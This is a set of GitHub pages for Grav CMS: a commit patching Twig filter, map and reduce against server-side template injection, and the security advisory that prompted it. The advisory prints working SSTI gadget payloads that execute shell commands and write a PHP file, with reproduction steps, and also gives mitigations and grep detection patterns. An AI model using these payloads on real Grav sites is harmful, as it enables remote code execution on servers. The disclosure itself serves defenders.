  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fcommit%2F244758d4383034fe4cd292d41e477177870b65ec)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=getgrav%2Fgrav)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[getgrav](/getgrav)
/
**[grav](/getgrav/grav)**
Public

* [Notifications](/login?return_to=%2Fgetgrav%2Fgrav) You must be signed in to change notification settings
* [Fork
  1.4k](/login?return_to=%2Fgetgrav%2Fgrav)
* [Star
   14.7k](/login?return_to=%2Fgetgrav%2Fgrav)

* [Code](/getgrav/grav)
* [Issues
  403](/getgrav/grav/issues)
* [Pull requests
  25](/getgrav/grav/pulls)
* [Discussions](/getgrav/grav/discussions)
* [Actions](/getgrav/grav/actions)
* [Projects
  0](/getgrav/grav/projects)
* [Security](/getgrav/grav/security)
* [Insights](/getgrav/grav/pulse)

Additional navigation options

* [Code](/getgrav/grav)
* [Issues](/getgrav/grav/issues)
* [Pull requests](/getgrav/grav/pulls)
* [Discussions](/getgrav/grav/discussions)
* [Actions](/getgrav/grav/actions)
* [Projects](/getgrav/grav/projects)
* [Security](/getgrav/grav/security)
* [Insights](/getgrav/grav/pulse)

## Commit

[Permalink](/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

also handle SSTI in reduce twig filter + function

[Browse files](/getgrav/grav/tree/244758d4383034fe4cd292d41e477177870b65ec)
Browse the repository at this point in the history

* Loading branch information

[![@rhukster](https://avatars.githubusercontent.com/u/1084697?s=40&v=4)](/rhukster)

[rhukster](/getgrav/grav/commits?author=rhukster "View all commits by rhukster")
committed
Jun 14, 2023

1 parent
[71bbed1](/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b)

commit 244758d

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**29 additions**
and
**6 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* CHANGELOG.md
  [CHANGELOG.md](#diff-06572a96a58dc510037d5efa622f9bec8519bc1beab13c9f251e97e657a9d4ed)
* system/src/Grav/Common/Twig/Extension

  + system/src/Grav/Common/Twig/Extension/GravExtension.php
    [GravExtension.php](#diff-a85d37d04dd05856c061a673dcedb849de79194bb315500bd681fb001484d644)

## There are no files selected for viewing

3 changes: 2 additions & 1 deletion

3
[CHANGELOG.md](#diff-06572a96a58dc510037d5efa622f9bec8519bc1beab13c9f251e97e657a9d4ed "CHANGELOG.md")

Show comments

[View file](/getgrav/grav/blob/244758d4383034fe4cd292d41e477177870b65ec/CHANGELOG.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -4,10 +4,11 @@ |
|  |  | 1. [](#new) |
|  |  | \* Added a new `system.languages.debug` option that adds a `<span class="translate-debug"></span>` around strings translated with `|t`. This can be styled by the theme as needed. |
|  |  | 1. [](#improved) |
|  |  | \* More robust SSTI handling in `|filter` and `|map` |
|  |  | \* More robust SSTI handling in `filter`, `map`, and `reduce` Twig filters and functions |
|  |  | \* Various SSTI improvements `Utils::isDangerousFunction()` |
|  |  | 1. [](#bugfix) |
|  |  | \* Fixed Twig `|map()` allowing code execution |
|  |  | \* Fixed Twig `|reduce()` allowing code execution |
|  |  |  |
|  |  | # v1.7.41.2 |
|  |  | ## 06/01/2023 |
| Expand Down | |  |

32 changes: 27 additions & 5 deletions

32
[system/src/Grav/Common/Twig/Extension/GravExtension.php](#diff-a85d37d04dd05856c061a673dcedb849de79194bb315500bd681fb001484d644 "system/src/Grav/Common/Twig/Extension/GravExtension.php")

Show comments

[View file](/getgrav/grav/blob/244758d4383034fe4cd292d41e477177870b65ec/system/src/Grav/Common/Twig/Extension/GravExtension.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -171,9 +171,10 @@ public function getFilters(): array |
|  |  | new TwigFilter('count', 'count'), |
|  |  | new TwigFilter('array\_diff', 'array\_diff'), |
|  |  |  |
|  |  | // Security fix |
|  |  | new TwigFilter('filter', [$this, 'filterFilter'], ['needs\_environment' => true]), |
|  |  | new TwigFilter('map', [$this, 'mapFilter'], ['needs\_environment' => true]), |
|  |  | // Security fixes |
|  |  | new TwigFilter('filter', [$this, 'filterFunc'], ['needs\_environment' => true]), |
|  |  | new TwigFilter('map', [$this, 'mapFunc'], ['needs\_environment' => true]), |
|  |  | new TwigFilter('reduce', [$this, 'reduceFunc'], ['needs\_environment' => true]), |
|  |  | ]; |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -250,6 +251,11 @@ public function getFunctions(): array |
|  |  | new TwigFunction('count', 'count'), |
|  |  | new TwigFunction('array\_diff', 'array\_diff'), |
|  |  | new TwigFunction('parse\_url', 'parse\_url'), |
|  |  |  |
|  |  | // Security fixes |
|  |  | new TwigFunction('filter', [$this, 'filterFunc'], ['needs\_environment' => true]), |
|  |  | new TwigFunction('map', [$this, 'mapFunc'], ['needs\_environment' => true]), |
|  |  | new TwigFunction('reduce', [$this, 'reduceFunc'], ['needs\_environment' => true]), |
|  |  | ]; |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -1706,7 +1712,7 @@ public function ofTypeFunc($var, $typeTest = null, $className = null) |
|  |  | \* @return array|CallbackFilterIterator |
|  |  | \* @throws RuntimeError |
|  |  | \*/ |
|  |  | function filterFilter(Environment $env, $array, $arrow) |
|  |  | function filterFunc(Environment $env, $array, $arrow) |
|  |  | { |
|  |  | if (!$arrow instanceof \Closure && !is\_string($arrow) || Utils::isDangerousFunction($arrow)) { |
|  |  | throw new RuntimeError('Twig |filter("' . $arrow . '") is not allowed.'); |
| Expand All | | @@ -1722,12 +1728,28 @@ function filterFilter(Environment $env, $array, $arrow) |
|  |  | \* @return array|CallbackFilterIterator |
|  |  | \* @throws RuntimeError |
|  |  | \*/ |
|  |  | function mapFilter(Environment $env, $array, $arrow) |
|  |  | function mapFunc(Environment $env, $array, $arrow) |
|  |  | { |
|  |  | if (!$arrow instanceof \Closure && !is\_string($arrow) || Utils::isDangerousFunction($arrow)) { |
|  |  | throw new RuntimeError('Twig |map("' . $arrow . '") is not allowed.'); |
|  |  | } |
|  |  |  |
|  |  | return twig\_array\_map($env, $array, $arrow); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* @param Environment $env |
|  |  | \* @param array $array |
|  |  | \* @param callable|string $arrow |
|  |  | \* @return array|CallbackFilterIterator |
|  |  | \* @throws RuntimeError |
|  |  | \*/ |
|  |  | function reduceFunc(Environment $env, $array, $arrow) |
|  |  | { |
|  |  | if (!$arrow instanceof \Closure && !is\_string($arrow) || Utils::isDangerousFunction($arrow)) { |
|  |  | throw new RuntimeError('Twig |reduce("' . $arrow . '") is not allowed.'); |
|  |  | } |
|  |  |  |
|  |  | return twig\_array\_map($env, $array, $arrow); |
|  |  | } |
|  |  | } |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `244758d`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fcommit%2F244758d4383034fe4cd292d41e477177870b65ec) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_8bb0d016_20250115_091035.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fblob%2F1.7.40%2Fsystem%2Fsrc%2FGrav%2FCommon%2FTwig%2FExtension%2FGravExtension.php)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fblob%2F1.7.40%2Fsystem%2Fsrc%2FGrav%2FCommon%2FTwig%2FExtension%2FGravExtension.php)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=getgrav%2Fgrav)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[getgrav](/getgrav)
/
**[grav](/getgrav/grav)**
Public

* [Notifications](/login?return_to=%2Fgetgrav%2Fgrav) You must be signed in to change notification settings
* [Fork
  1.4k](/login?return_to=%2Fgetgrav%2Fgrav)
* [Star
   14.7k](/login?return_to=%2Fgetgrav%2Fgrav)

* [Code](/getgrav/grav/tree/1.7.40)
* [Issues
  403](/getgrav/grav/issues)
* [Pull requests
  25](/getgrav/grav/pulls)
* [Discussions](/getgrav/grav/discussions)
* [Actions](/getgrav/grav/actions)
* [Projects
  0](/getgrav/grav/projects)
* [Security](/getgrav/grav/security)
* [Insights](/getgrav/grav/pulse)

Additional navigation options

* [Code](/getgrav/grav/tree/1.7.40)
* [Issues](/getgrav/grav/issues)
* [Pull requests](/getgrav/grav/pulls)
* [Discussions](/getgrav/grav/discussions)
* [Actions](/getgrav/grav/actions)
* [Projects](/getgrav/grav/projects)
* [Security](/getgrav/grav/security)
* [Insights](/getgrav/grav/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_89952be2_20250115_091039.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fsecurity%2Fadvisories%2FGHSA-96xv-rmwj-6p9w)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgetgrav%2Fgrav%2Fsecurity%2Fadvisories%2FGHSA-96xv-rmwj-6p9w)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=getgrav%2Fgrav)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[getgrav](/getgrav)
/
**[grav](/getgrav/grav)**
Public

* [Notifications](/login?return_to=%2Fgetgrav%2Fgrav) You must be signed in to change notification settings
* [Fork
  1.4k](/login?return_to=%2Fgetgrav%2Fgrav)
* [Star
   14.7k](/login?return_to=%2Fgetgrav%2Fgrav)

* [Code](/getgrav/grav)
* [Issues
  403](/getgrav/grav/issues)
* [Pull requests
  25](/getgrav/grav/pulls)
* [Discussions](/getgrav/grav/discussions)
* [Actions](/getgrav/grav/actions)
* [Projects
  0](/getgrav/grav/projects)
* [Security](/getgrav/grav/security)
* [Insights](/getgrav/grav/pulse)

Additional navigation options

* [Code](/getgrav/grav)
* [Issues](/getgrav/grav/issues)
* [Pull requests](/getgrav/grav/pulls)
* [Discussions](/getgrav/grav/discussions)
* [Actions](/getgrav/grav/actions)
* [Projects](/getgrav/grav/projects)
* [Security](/getgrav/grav/security)
* [Insights](/getgrav/grav/pulse)

# Grav Server-side Template Injection (SSTI) via Insufficient Validation in filterFilter

High

[rhukster](/rhukster)
published
GHSA-96xv-rmwj-6p9w
Jun 14, 2023

## Package

No package listed

## Affected versions

<= v1.7.40 (Commit 685d762) (Latest version as of writing)

## Patched versions

None

## Description

Hi,

actually we have sent the bug report to security@getgrav.org on 27th March 2023 and on 10th April 2023.

# Grav Server-side Template Injection (SSTI) via Insufficient Validation in filterFilter

## Summary:

| **Product** | Grav CMS |
| --- | --- |
| **Vendor** | Grav |
| **Severity** | High - Users with login access to Grav Admin panel and page creation/update permissions are able to obtain remote code/command execution |
| **Affected Versions** | <= [v1.7.40](https://github.com/getgrav/grav/tree/1.7.40) (Commit [685d762](https://github.com/getgrav/grav/commit/685d76231a057416651ed192a6a2e83720800e61)) (Latest version as of writing) |
| **Tested Versions** | v1.7.40 |
| **Internal Identifier** | STAR-2023-0007 |
| **CVE Identifier** | TBD |
| **CWE(s)** | CWE-20: Improper Input Validation, CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine |

## CVSS3.1 Scoring System:

**Base Score:** 7.2 (High)

**Vector String:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`

| **Metric** | **Value** |
| --- | --- |
| **Attack Vector (AV)** | Network |
| **Attack Complexity (AC)** | Low |
| **Privileges Required (PR)** | High |
| **User Interaction (UI)** | None |
| **Scope (S)** | Unchanged |
| **Confidentiality (C)** | High |
| **Integrity (I)** | High |
| **Availability (A)** | High |

## Product Overview:

Grav is a PHP-based flat-file content management system (CMS) designed to provide a fast and simple way to build websites. It supports rendering of web pages written in Markdown and Twig expressions, and provides an administration panel to manage the entire website via an optional Admin plugin.

## Vulnerability Summary:

There is a logic flaw in the `GravExtension.filterFilter()` function whereby validation against a denylist of unsafe functions is only performed when the argument passed to filter is a string. However, passing an array as a callable argument allows the validation check to be skipped. Consequently, a low privileged attacker with login access to Grav Admin panel and page creation/update permissions is able to inject malicious templates to obtain remote code execution.

## Vulnerability Details:

The vulnerability can be found in the `GravExtension.filterFilter()` function declared in [`/system/src/Grav/Common/Twig/Extension/GravExtension.php`](https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Twig/Extension/GravExtension.php#L1692-L1698):

```
...
class GravExtension extends AbstractExtension implements GlobalsInterface
{
    ...

    /**
     * Return a list of all filters.
     *
     * @return array
     */
    public function getFilters(): array
    {
        return [
            ...

            // Security fix
            new TwigFilter('filter', [$this, 'filterFilter'], ['needs_environment' => true]),
        ];
    }

    ...

    /**
     * @param Environment $env
     * @param array $array
     * @param callable|string $arrow
     * @return array|CallbackFilterIterator
     * @throws RuntimeError
     */
    function filterFilter(Environment $env, $array, $arrow)
    {
        if (is_string($arrow) && Utils::isDangerousFunction($arrow)) { // [1]
            throw new RuntimeError('Twig |filter("' . $arrow . '") is not allowed.');
        }

        return \twig_array_filter($env, $array, $arrow); // [2]
    }
}
```

At [1], the `$arrow` parameter contains the argument supplied to the filter. For example, it may refer to `"funcname"` in `{{ array|filter("funcname") }}` or the closure (a.k.a. arrow function) `el => el != 'exclude'` in `{{ array|filter(el => el != 'exclude') }}`. Observe that `Utils::isDangerousFunction($arrow)` is only invoked if `$arrow` is a string. As such, non-string arguments may be passed to `twig_array_filter()` at [2] due to the absence of type enforcement at [1].

The implementation of the `twig_array_filter()` function can be found in [/src/Extension/CoreExtension.php](https://github.com/twigphp/Twig/blob/v1.44.7/src/Extension/CoreExtension.php) within Twig's codebase:

```
function twig_array_filter(Environment $env, $array, $arrow)
{
    if (!twig_test_iterable($array)) {
        throw new RuntimeError(sprintf('The "filter" filter expects an array or "Traversable", got "%s".', \is_object($array) ? \get_class($array) : \gettype($array)));
    }

    if (!$arrow instanceof Closure && $env->hasExtension('\Twig\Extension\SandboxExtension') && $env->getExtension('\Twig\Extension\SandboxExtension')->isSandboxed()) { // [3]
        throw new RuntimeError('The callable passed to "filter" filter must be a Closure in sandbox mode.');
    }

    if (\is_array($array)) {
        if (\PHP_VERSION_ID >= 50600) {
            return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH); // [4]
        }

        return array_filter($array, $arrow);
    }

    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
}
```

At [3], a runtime error is thrown if `$arrow` is not a closure and Twig sandbox is enabled. However, since Grav does not use the Twig Sandbox extension, the check passes successfully even when `$arrow` is not a closure. Subsequently at [4], `array_filter()` is invoked with the user-controlled `$array` input and `$arrow` parameter.

Note that the method signature of `array_filter()` is as follows:

```
array_filter(array $array, ?callable $callback = null, int $mode = 0): array
```

A common mistake that developers make is assuming that the `callable` type refers to a `string` type. This is untrue, and it is [well documented in the PHP Manual](https://www.php.net/manual/en/language.types.callable.php):

> A method of an instantiated object is passed as an **array containing an object at index 0 and the method name at index 1**. Accessing protected and private methods from within a class is allowed.
>
> Static class methods can also be passed without instantiating an object of that class by either, **passing the class name instead of an object at index 0, or passing `ClassName::methodName`**.

This means that all of the following method calls are valid:

```
// Type 1: Simple callback -- invokes system("id")
array_filter(array("id"), "system");

// Type 2: Static class method call -- invokes Class::staticMethod($arg)
array_filter(array($arg), array("Class", "staticMethod"));
array_filter(array($arg), array("Class::staticMethod")); // same as above

// Type 3: Object method call -- invokes $obj->method($arg)
array_filter(array($arg), array($obj, "method"));
```

Going back to [1], if `$arrow` is an `array` instead of a `string` or `closure`, the validation check to prevent invocation of unsafe functions is completely skipped. Multiple static class methods within Grav's codebase and its dependencies were found to be suitable gadgets for achieving for remote code execution:

```
// Gadget 1: Using \Grav\Common\Utils::arrayFilterRecursive() within Grav's codebase to invoke system("id"):
{% set id = {'id': 0} %}
{{ {'system': id} | filter('\\Grav\\Common\\Utils', 'arrayFilterRecursive') }}

// Gadget 2: Using \Symfony\Component\VarDumper\Vardumper::setHandler() and \Symfony\Component\VarDumper\Vardumper::dump() to invoke system("id"):
{{ ['system'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'setHandler'])}}
{{ ['id'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'dump']) }}

// Gadget 3: Using \RocketTheme\Toolbox\File\File::instance() in Grav's default theme to perform arbitrary file write to rce.php in the webroot:
{{ (['rce.php'] | map(['\\RocketTheme\\Toolbox\\File\\File', 'instance']))[0].save('<?php echo phpinfo(); ') }}

// Gadget 4: Using \Symfony\Component\Process\Process::fromShellCommandline() to invoke system("id"):
{{ {'/':'sleep 3'} | map(['\\Symfony\\Component\\Process\\Process', 'fromShellCommandline']) | map(e => e.run()) | print_r }}
```
## Exploit Conditions:

This vulnerability can be exploited if the attacker has access to:

1. an administrator account, or
2. a non-administrator, user account that are granted the following permissions:
   * login access to Grav admin panel, and
   * page creation or update rights

## Reproduction Steps:

1. Log in to Grav Admin using an administrator account.
2. Navigate to `Accounts > Add`, and ensure that the following permissions are assigned when creating a new low-privileged user:
   * Login to Admin - Allowed
   * Page Update - Allowed
3. Log out of Grav Admin, and log back in using the account created in step 2.
4. Navigate to `http://<grav_installation>/admin/pages/home`.
5. Click the `Advanced` tab and select the checkbox beside `Twig` to ensure that Twig processing is enabled for the modified webpage.
6. Under the `Content` tab, insert the following payload within the editor:
   ```
   // Gadget 1: Using \Grav\Common\Utils::arrayFilterRecursive() within Grav's codebase to invoke system("id"):
   {% set id = {'id': 0} %}
   {{ {'system': id} | filter('\\Grav\\Common\\Utils', 'arrayFilterRecursive') }}
   ```
7. Click the Preview button. Observe that the output of the `id` shell command is returned in the preview.

## Suggested Mitigations:

Patch the logic flaw in the `GravExtension.filterFilter()` function declared in `/system/src/Grav/Common/Twig/Extension/GravExtension.php` to ensure that the `$arrow` paramater passed to the `filterFilter()` function must either be a `string` or an arrow function as such:

```
...
class GravExtension extends AbstractExtension implements GlobalsInterface
{
    ...

    /**
     * @param Environment $env
     * @param array $array
     * @param callable|string $arrow
     * @return array|CallbackFilterIterator
     * @throws RuntimeError
     */
    function filterFilter(Environment $env, $array, $arrow)
    {
-       if (is_string($arrow) && Utils::isDangerousFunction($arrow)) {
+       if (!$arrow instanceof Closure && !is_string($arrow) || Utils::isDangerousFunction($arrow)) {
            throw new RuntimeError('Twig |filter("' . $arrow . '") is not allowed.');
        }

        return \twig_array_filter($env, $array, $arrow);
    }
}
```

`Utils::isDangerousFunction()` in [/system/src/Grav/Common/Utils.php](https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1956-L2074) should also be patched to prevent static class methods from being invoked. For example,

```
...
abstract class Utils
{
    ...
    /**
     * @param string $name
     * @return bool
     */
    public static function isDangerousFunction(string $name): bool
    {
        ...

+       if (is_array($name) || strpos($name, ":") !== false) {
+           return false;
+       }

        if (in_array($name, $commandExecutionFunctions)) {
            return true;
        }

        if (in_array($name, $codeExecutionFunctions)) {
            return true;
        }

        if (isset($callbackFunctions[$name])) {
            return true;
        }

        if (in_array($name, $informationDiscosureFunctions)) {
            return true;
        }

        if (in_array($name, $otherFunctions)) {
            return true;
        }

        return static::isFilesystemFunction($name);
    }
    ...
}
```

End users should also ensure that `twig.undefined_functions` and `twig.undefined_filters` properties in `/path/to/webroot/system/config/system.yaml` configuration file are set to `false` to disallow Twig from treating undefined filters/functions as PHP functions and executing them.

## Detection Guidance:

The following strategies may be used to detect potential exploitation attempts.

1. Searching within Markdown pages using the following shell command:

   `grep -Priz -e '\|\s*(filter|map|reduce)\s*\(' /path/to/webroot/user/pages/`
2. Searching within Doctrine cache data using the following shell command:

   `grep -Priz -e '\|\s*(filter|map|reduce)\s*\(' --include '*.doctrinecache.data' /path/to/webroot/cache/`
3. Searching within Twig cache using the following shell command:

   `grep -Priz -e 'twig_array_(filter|map|reduce)' /path/to/webroot/cache/twig/`
